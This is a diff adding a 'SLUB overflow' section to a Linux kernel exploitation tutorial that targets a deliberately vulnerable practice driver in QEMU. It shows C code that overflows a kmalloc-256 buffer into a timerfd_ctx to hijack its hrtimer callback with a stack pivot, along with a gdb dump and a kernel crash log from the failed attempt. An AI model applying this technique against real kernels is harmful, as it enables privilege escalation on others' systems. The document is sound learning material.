@@ -28,6 +28,7 @@
 	 * [Bypass SMEP with stack pivoting](#bypass-smep-with-stack-pivoting)
 * [Heap overflow](#heap-overflow)
 	 * [Heap overflow primitive](#heap-overflow-primitive)  
+	 * [SLUB overflow](#slub-overflow)
 
 ## Creating the enviornment and the first kernel module
 
@@ -966,4 +967,107 @@ uid=1000(user) gid=1000 groups=1000
 [22953.922445] Freeing kernel memory
 [+] Memory freed
 ```  
+### SLUB overflow  
+This time we exploit the heap of our kernel driver using the slab allocator of the system. For more info about this allocator pls refer to the links in the links file. Since we are on a modern linux machine, we will use the SLUB allocator. Basically we used it by calling `kmalloc` and `kfree` previously. Now, how do we exploit it?  
+We know, that SLUB has linked lists of different sizes and different lists for heavily used kernel structures, like file descriptors. So we need something, that is allocated by the kernel, has a structure, where we can modify the RIP register and something, that uses the general lists. One working candidate is `timerfd_ctx`. It is allocated on the `kmalloc-256` list, and has two possible fields to modify the instruction pointer, more specifically two callback functions. But these functions are mutually exclusive, since the `timerfd_ctx` has an union, that can have one of two structures: `hrtimer` and `alarm`. Since `alarm` contains an `hrtimer` structure, it is easyer to use `hrtimer` for our exploit.  
+One hard part of the exploit is, that we need to modify the `timerfd_ctx` struct in such a way, that we do not mess up the whole structure. We need to make sure, that the structure has enough information to be able to arrive to the callback. For this purpose, we need to study the kernel source a bit.  
+First, how do we allocate this structure? We can do it with the `timerfd_create` syscall, which has two parameters: a clockid and a flag variable. We only need to provide the clockid. Because we need the struct to use the timer structure, we need to pass `CLOCK_MONOTONIC` macro. So the calling of the function looks like this:  
+```C
+void create_timer_instance(){
+	int tfd;
+	struct itimerspec i;
 
+	i.it_interval.tv_sec = 0;
+	i.it_interval.tv_nsec = 0;
+	i.it_value.tv_sec = 5;
+	i.it_value.tv_nsec = 0;
+
+	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
+	timerfd_settime(tfd, 0, &i, 0);
+}
+```  
+So we can allocate this structure on the kernel heap now. In real enviornments we would have a problem with putting this structure right after our allocation, but since there are not many programs on this qemu instance, we won't have a problem with it. Now let's get to the structure of `hrtimer`.  
+The first element of the hrtimer is a `timerqueue_node` struct, which contains an `rb_node` struct and a 64 bit integer. The `rb_node` contains an `unsigned long` and two pointers. After these elements in hrtimer, we have another 64 bit integer, and then comes the callback function pointer, that we need to overwrite. If we play around with gdb, we can examine this on the stack:  
+```
+0xffff888004510500:     0xffff888004510500      0xffffc90000227a68
+0xffff888004510510:     0xffff888007a1e6a0      0x00000038f005b19d
+0xffff888004510520:     0x00000038f005b19d      0xffffffff8122f280
+0xffff888004510530:     0xffff888007a1e1c0      0x0000000000000000
+0xffff888004510540:     0x0000000000000000      0x0000000000000000
+0xffff888004510550:     0x0000000000000000      0x0000000000000000
+0xffff888004510560:     0x0000000000000000      0x0000000000000000
+0xffff888004510570:     0x0000000000000000      0x0000000000000000
+0xffff888004510580:     0xffff888004510600      0x0000000000000000
+0xffff888004510590:     0xffff888004510590      0xffff888004510590
+0xffff8880045105a0:     0x0000000000000000      0x0000000000000001
+0xffff8880045105b0:     0x0000000000000000      0x0000000000000000
+0xffff8880045105c0:     0x0000000000000000      0x0000000000000000
+0xffff8880045105d0:     0x0000000000000000      0x0000000000000000
+0xffff8880045105e0:     0x0000000000000000      0x0000000000000000
+0xffff8880045105f0:     0x0000000000000000      0x0000000000000000
+//timerfd_ctx from now
+0xffff888004510600:     0x0000000000000001      0xffffc90000227a68
+0xffff888004510610:     0xffff888007a1e6a0      0x000000404d880b04
+0xffff888004510620:     0x000000404d880b04      0xffffffff8122f280
+0xffff888004510630:     0xffff888007a1e1c0      0x0000000000000001
+0xffff888004510640:     0x0000000000000000      0x0000000000000000
+0xffff888004510650:     0x0000000000000000      0x0000000000000000
+0xffff888004510660:     0x0000000000000000      0x0000000000000000
+0xffff888004510670:     0x0000000000000000      0x0000000000000000
+0xffff888004510680:     0x167161eee8f776ec      0x0000000000000000
+0xffff888004510690:     0xffff888004510690      0xffff888004510690
+0xffff8880045106a0:     0x0000000000000000      0x0000000000000001
+0xffff8880045106b0:     0x0000000000000000      0x0000000000000000
+0xffff8880045106c0:     0x0000000000000000      0x0000000000000000
+0xffff8880045106d0:     0x0000000000000000      0x0000000000000000
+0xffff8880045106e0:     0x0000000000000000      0x0000000000000000
+0xffff8880045106f0:     0x0000000000000000      0x0000000000000000
+```
+The first 256 Bytes are the allocated memory that we kmalloc-ed before, full of memory junk. Then comes the timerfd_ctx. As we can see, the before mentioned variables come in order. Our callback pointer is `0xffffffff8122f280`. We need to overwrite that, but keep the original values in the other addresses. To do that, we can allocate our 256 Byte memory, then read 512 Byte from that address. With that we become the content of the previous dump. From that we can retrieve the 5 values we want to preserve, then before sending the payload, setting these values and the return address on the top. This is how it looks like:  
+```C
+unsigned long target[64] = {0};
+unsigned long payload[38] = {0};
+unsigned int off = 32;
+...
+printf("[+] Allocating address...\n");
+driver_alloc(iom);
+printf("[+] Creating timerfd struct...\n");
+create_timer_instance();
+printf("[+] Overloading timerfd...\n");
+driver_read_write(target, iom->addr, 512);
+for(int i = 0; i < 5; i++){
+	payload[off] = target[off];
+	off++;
+}
+payload[off] = stacklift;
+...
+printf("[+] Sending payload to the driver...\n");
+driver_read_write(iom->addr, payload, 304);
+printf("[+] Triggering timerfd callback...\n");
+sleep(5);
+```  
+The size of 38 for payload is basically the 32 unsigned long values, which is 256, and we need 6 more to overflow the timerfd. The rest of the code is self explanatory. I just wrapped the ioctl calls into functions which take care about error handling too.  
+But what do we do with the return address? Basically the stack pivot exploit. I simply copied the necessary parts from the smep bypass, and made a simple rop exploit using mmap and stacklift. Let's run it!  
+```
+# ./sof                                                                                 
+[+] Creating ROP chain on memory...                                                     
+[+] Opening device file...                                                              
+[+] Allocating address...                                                               
+[   23.871856] Allocating kernel memory                                                 
+[+] Creating timerfd struct...                                                                                                                                                  
+[+] Overloading timerfd...                                                              
+[   23.877111] R/W kernel heap                                                          
+[+] Sending payload to the driver...                                                    
+[   23.882252] R/W kernel heap
+[+] Triggering timerfd callback...
+[   28.876217] BUG: kernel NULL pointer dereference, address: 0000000000000360
+[   28.880444] #PF: supervisor read access in kernel mode
+[   28.881646] #PF: error_code(0x0000) - not-present page
+[   28.882265] PGD 4526067 P4D 4526067 PUD 450f067 PMD 0 
+[   28.882882] Oops: 0000 [#1] SMP NOPTI
+[   28.883336] CPU: 0 PID: 0 Comm: swapper/0 Tainted: G           O      5.11.0 #3
+[   28.884205] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+[   28.885254] RIP: 0010:fixup_vdso_exception+0x1d/0xa0
+...
+```  
+Well, that is bad. What happens, is that we wait for the timer to trigger, but it works with an interrupt. With interrupts there is a problem, that it only has page tables for the kernel space memory, not for the user space. So we will never be able to rop from our mmaped memory. We need another solution.  
